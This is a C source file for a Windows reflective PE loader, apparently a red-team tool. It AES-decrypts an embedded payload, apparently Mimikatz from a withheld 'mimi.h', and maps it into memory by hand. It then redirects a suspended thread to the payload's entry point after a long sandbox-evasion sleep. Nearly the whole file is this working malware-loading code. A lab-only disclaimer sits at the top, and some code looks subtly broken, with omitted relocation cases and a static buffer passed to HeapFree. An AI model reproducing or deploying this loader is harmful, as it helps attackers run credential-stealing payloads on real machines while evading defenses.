
/*
 *		Author: R3x5
 *		GitHub: https://github.com/R3x5
 *
 *
 *		This code is only for test and lab enviroments
 * 
 *		any abusing use is strictly prohibited.
 *
 */

#include <Windows.h>
#include <winternl.h>
#include <stdio.h>

// mimi.h file is not provided for avoiding any abuse.
#include "mimi.h"

typedef struct _PE_HDRS {
	PBYTE pFileBuffer;
	DWORD dwFileSize;
	BOOL bIsDLLFile;

	PIMAGE_NT_HEADERS pImgNtHdrs;
	PIMAGE_SECTION_HEADER pImgSecHdr;

	PIMAGE_DATA_DIRECTORY pEntryImportDataDir;
	PIMAGE_DATA_DIRECTORY pEntryBaseRelocDataDir;
	PIMAGE_DATA_DIRECTORY pEntryTLSDataDir;
	PIMAGE_DATA_DIRECTORY pEntryExceptionDataDir;
	PIMAGE_DATA_DIRECTORY pEntryExportDataDir;

}PE_HDRS, * PPE_HDRS;

typedef struct _BASE_RELOCATION_ENTRY {
	WORD Offset : 12;
	WORD Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;

PBYTE pFileBuffer = (PBYTE)PEBuff;
DWORD dwFileSize = sizeof(PEBuff);
PE_HDRS PeHdrStruct = { 0 };
PVOID pExportedFuncAddress = NULL;

VOID Recover(unsigned char* buffer, DWORD size, unsigned char* secret, DWORD secretLen) {
	HCRYPTPROV prov = NULL;
	HCRYPTHASH hash = NULL;
	HCRYPTKEY  aes = NULL;
	BOOL ok = FALSE;

	do {
		if (!CryptAcquireContextW(&prov, 0, 0, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
			break;

		if (!CryptCreateHash(prov, CALG_SHA_256, 0, 0, &hash))
			break;

		if (!CryptHashData(hash, secret, secretLen, 0))
			break;

		if (!CryptDeriveKey(prov, CALG_AES_256, hash, 0, &aes))
			break;

		DWORD dataLen = size;

		if (!CryptDecrypt(aes, 0, FALSE, 0, buffer, &dataLen))
			break;

		ok = TRUE;

	} while (FALSE);

	if (aes)
		CryptDestroyKey(aes);

	if (hash)
		CryptDestroyHash(hash);

	if (prov)
		CryptReleaseContext(prov, 0);
}

BOOL InitializePeStruct(PPE_HDRS ctx, PBYTE buffer, DWORD size) {
	PIMAGE_DOS_HEADER dos = NULL;
	PIMAGE_NT_HEADERS nt = NULL;

	if (ctx == NULL || buffer == NULL || size == 0)
		return FALSE;

	ctx->pFileBuffer = buffer;
	ctx->dwFileSize = size;

	dos = (PIMAGE_DOS_HEADER)buffer;
	nt = (PIMAGE_NT_HEADERS)(buffer + dos->e_lfanew);

	if (nt->Signature != IMAGE_NT_SIGNATURE)
		return FALSE;

	ctx->pImgNtHdrs = nt;
	ctx->pImgSecHdr = IMAGE_FIRST_SECTION(nt);

	PIMAGE_DATA_DIRECTORY dirs = nt->OptionalHeader.DataDirectory;

	ctx->pEntryImportDataDir = &dirs[IMAGE_DIRECTORY_ENTRY_IMPORT];
	ctx->pEntryBaseRelocDataDir = &dirs[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	ctx->pEntryTLSDataDir = &dirs[IMAGE_DIRECTORY_ENTRY_TLS];
	ctx->pEntryExceptionDataDir = &dirs[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
	ctx->pEntryExportDataDir = &dirs[IMAGE_DIRECTORY_ENTRY_EXPORT];

	ctx->bIsDLLFile = (nt->FileHeader.Characteristics & IMAGE_FILE_DLL) != 0;

	return TRUE;
}

BOOL FixImportAddressTable(PIMAGE_DATA_DIRECTORY pEntryImportDataDir, PBYTE pPeBaseAddress) {
	PIMAGE_IMPORT_DESCRIPTOR pImgImpDescriptor = NULL;
	HMODULE hModule = NULL;
	PIMAGE_THUNK_DATA pOriginal = NULL, pFirst = NULL;
	ULONG_PTR pFuncAddress = NULL;
	PIMAGE_IMPORT_BY_NAME pImgImpByName = NULL;
	SIZE_T ImgThunkSize = 0;
	for (size_t i = 0; i < pEntryImportDataDir->Size; i += sizeof(IMAGE_IMPORT_DESCRIPTOR)) {
		pImgImpDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(pPeBaseAddress + pEntryImportDataDir->VirtualAddress + i);
		if (pImgImpDescriptor->OriginalFirstThunk == NULL && pImgImpDescriptor->FirstThunk == NULL)
			break;
		ImgThunkSize = 0;
		if (!(hModule = LoadLibraryA((LPSTR)(pPeBaseAddress + pImgImpDescriptor->Name))))
			return FALSE;
		while (TRUE) {
			pOriginal = (PIMAGE_THUNK_DATA)(pPeBaseAddress + (ULONG_PTR)pImgImpDescriptor->OriginalFirstThunk + ImgThunkSize),
				pFirst = (PIMAGE_THUNK_DATA)(pPeBaseAddress + (ULONG_PTR)pImgImpDescriptor->FirstThunk + ImgThunkSize);
			pImgImpByName = (PIMAGE_IMPORT_BY_NAME)(pPeBaseAddress + pOriginal->u1.AddressOfData);
			if (pOriginal->u1.Function == NULL && pFirst->u1.Function == NULL)
				break;
			if (IMAGE_SNAP_BY_ORDINAL(pOriginal->u1.Ordinal)) {
				if (!(pFuncAddress = (ULONG_PTR)GetProcAddress(hModule, (LPSTR)(IMAGE_ORDINAL(pOriginal->u1.Ordinal))))) {
					return FALSE;
				}
			}
			else {
				if (!(pFuncAddress = (ULONG_PTR)GetProcAddress(hModule, (LPSTR)pImgImpByName->Name))) {
					return FALSE;
				}
			}
			pFirst->u1.Function = (ULONGLONG)pFuncAddress;
			ImgThunkSize += sizeof(IMAGE_THUNK_DATA);
		}
	}
	return TRUE;
}
BOOL FixReloc(PIMAGE_DATA_DIRECTORY pEntryBaseRelocDataDir, ULONG_PTR pPeBaseAddress, ULONG_PTR pPreferableAddress) {
	PIMAGE_BASE_RELOCATION pImgBaseReloc = (PIMAGE_BASE_RELOCATION)(pPeBaseAddress + pEntryBaseRelocDataDir->VirtualAddress);
	PBASE_RELOCATION_ENTRY pEntry = NULL;
	ULONG_PTR uDeltaOffset = pPeBaseAddress - pPreferableAddress;
	while (pImgBaseReloc->VirtualAddress) {
		pEntry = (PBASE_RELOCATION_ENTRY)(pImgBaseReloc + 1);
		while ((PBYTE)pEntry != (PBYTE)pImgBaseReloc + pImgBaseReloc->SizeOfBlock) {
			if (pEntry->Type == IMAGE_REL_BASED_DIR64) {
				*((ULONG_PTR*)(pPeBaseAddress + pImgBaseReloc->VirtualAddress + pEntry->Offset)) += uDeltaOffset;
			}
			// more cases omitted...
			pEntry++;
		}
		pImgBaseReloc = (PIMAGE_BASE_RELOCATION)pEntry;
	}
	return TRUE;
}

BOOL isPE(const LPVOID pImage) {
	PIMAGE_DOS_HEADER pImageDosHdr = (PIMAGE_DOS_HEADER)pImage;
	PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)((ULONG_PTR)pImageDosHdr + pImageDosHdr->e_lfanew);
	if (pImgNtHdrs->Signature == IMAGE_NT_SIGNATURE)
		return TRUE;

	return FALSE;
}

BOOL ChangeMemoryPermmisions(ULONG_PTR pPeBaseAddress, PIMAGE_NT_HEADERS pImgNtHdrs, PIMAGE_SECTION_HEADER pImgSecHdr) {
	DWORD total = pImgNtHdrs->FileHeader.NumberOfSections;
	for (DWORD idx = 0; idx < total; ++idx) {
		PIMAGE_SECTION_HEADER s = &pImgSecHdr[idx];

		if (s->SizeOfRawData == 0 || s->VirtualAddress == 0)
			continue;

		DWORD flags = s->Characteristics;
		DWORD protect = 0;
		DWORD old = 0;

		BOOL r = (flags & IMAGE_SCN_MEM_READ) != 0;
		BOOL w = (flags & IMAGE_SCN_MEM_WRITE) != 0;
		BOOL x = (flags & IMAGE_SCN_MEM_EXECUTE) != 0;

		if (x) {
			if (r && w)
				protect = PAGE_EXECUTE_READWRITE;
			else if (r)
				protect = PAGE_EXECUTE_READ;
			else if (w)
				protect = PAGE_EXECUTE_WRITECOPY;
			else
				protect = PAGE_EXECUTE;
		}
		else {
			if (r && w)
				protect = PAGE_READWRITE;
			else if (r)
				protect = PAGE_READONLY;
			else if (w)
				protect = PAGE_WRITECOPY;
		}

		PVOID address = (PVOID)(pPeBaseAddress + s->VirtualAddress);

		if (!VirtualProtect(address, s->SizeOfRawData, protect, &old))
			return FALSE;
	}
	return TRUE;
}

/*
 *		EAT is Optional for a loader
 */

//PVOID FetchExportedFunctionAddress(PIMAGE_DATA_DIRECTORY pEntryExportDataDir, ULONG_PTR pPeBaseAddress, LPCSTR cFuncName) {
//	PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pPeBaseAddress + pEntryExportDataDir->VirtualAddress);
//	PDWORD FunctionNameArray = (PDWORD)(pPeBaseAddress + pImgExportDir->AddressOfNames);
//	PDWORD FunctionAddressArray = (PDWORD)(pPeBaseAddress + pImgExportDir->AddressOfFunctions);
//	PWORD FunctionOrdinalArray = (PWORD)(pPeBaseAddress + pImgExportDir->AddressOfNameOrdinals);
//
//	for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {
//		CHAR* pFunctionName = (CHAR*)(pPeBaseAddress + FunctionNameArray[i]);
//		PVOID	pFunctionAddress = (PVOID)(pPeBaseAddress + FunctionAddressArray[FunctionOrdinalArray[i]]);
//		if (strcmp(cFuncName, pFunctionName) == 0) {
//			return pFunctionAddress;
//		}
//	}
//	return NULL;
//}

BOOL RunMappedPE(HANDLE threadHandle, PPE_HDRS pPeHdrs, LPCSTR exportName, LPCSTR args) {
	if (pPeHdrs == NULL)
		return FALSE;

	SIZE_T imageSize = pPeHdrs->pImgNtHdrs->OptionalHeader.SizeOfImage;

	PBYTE imageBase = (PBYTE)VirtualAlloc(
		NULL,
		imageSize,
		MEM_RESERVE | MEM_COMMIT,
		PAGE_READWRITE
	);

	if (!imageBase)
		return FALSE;

	DWORD secCount = pPeHdrs->pImgNtHdrs->FileHeader.NumberOfSections;

	for (DWORD s = 0; s < secCount; s++) {
		PIMAGE_SECTION_HEADER section = &pPeHdrs->pImgSecHdr[s];

		if (section->SizeOfRawData == 0)
			continue;

		PBYTE dest = imageBase + section->VirtualAddress;
		PBYTE src = pPeHdrs->pFileBuffer + section->PointerToRawData;

		memcpy(dest, src, section->SizeOfRawData);
	}

	if (!FixImportAddressTable(pPeHdrs->pEntryImportDataDir, imageBase)) {
		printf("[-] IAT repair failed\n");
		return FALSE;
	}

	if (!FixReloc(
		pPeHdrs->pEntryBaseRelocDataDir,
		imageBase,
		pPeHdrs->pImgNtHdrs->OptionalHeader.ImageBase)) {
		return FALSE;
	}

	if (!ChangeMemoryPermmisions(imageBase, pPeHdrs->pImgNtHdrs, pPeHdrs->pImgSecHdr))
		return FALSE;

	CONTEXT ctx;
	ZeroMemory(&ctx, sizeof(ctx));
	ctx.ContextFlags = CONTEXT_FULL;

	if (!GetThreadContext(threadHandle, &ctx)) {
		printf("[-] GetThreadContext failed\n");
		return FALSE;
	}
	ULONG_PTR entry = imageBase + pPeHdrs->pImgNtHdrs->OptionalHeader.AddressOfEntryPoint;
	ctx.Rip = entry;
	if (!SetThreadContext(threadHandle, &ctx)) {
		printf("[-] SetThreadContext failed\n");
		return FALSE;
	}

	printf("[+] waiting before resume...\n");
	SleepEx(150000, FALSE);

	ResumeThread(threadHandle);

	return TRUE;
}

DWORD WINAPI WorkerRoutine(LPVOID param)
{
	HANDLE threadHandle = *(HANDLE*)param;

	SuspendThread(threadHandle);
	printf("[+] thread suspended\n");

	printf("[+] decrypting payload\n");

	Recover(PEBuff, sizeof(PEBuff), keyBuff, sizeof(keyBuff));

	if (!PEBuff) {
		printf("[-] payload buffer invalid (%u)\n", GetLastError());
		return 1;
	}

	if (!isPE(PEBuff)) {
		printf("[-] invalid PE format\n");

		if (PEBuff)
			HeapFree(GetProcessHeap(), 0, PEBuff);

		return 1;
	}

	printf("[+] PE verified\n");
	printf("[+] payload @ %p\n", PEBuff);

	if (!InitializePeStruct(&PeHdrStruct, pFileBuffer, dwFileSize))
		return 1;

	if (!RunMappedPE(threadHandle, &PeHdrStruct, NULL, NULL)) {
		printf("[-] PE execution failed\n");
		return 1;
	}
	return 0;
}

int main(void) {
	HANDLE currentThread = GetCurrentThread();
	HANDLE realThreadHandle = NULL;
	HANDLE worker = NULL;

	if (
			!DuplicateHandle(
			GetCurrentProcess(),
			currentThread,
			GetCurrentProcess(),
			&realThreadHandle,
			0,
			FALSE,
			DUPLICATE_SAME_ACCESS)
		) {
		printf("[-] handle duplication failed\n");
		return -1;
	}

	worker = CreateThread(
		NULL,
		0,
		WorkerRoutine,
		&realThreadHandle,
		0,
		NULL
	);

	if (!worker) {
		CloseHandle(realThreadHandle);
		return -1;
	}

	WaitForSingleObject(worker, INFINITE);

	CloseHandle(worker);
	CloseHandle(realThreadHandle);

	return 0;
}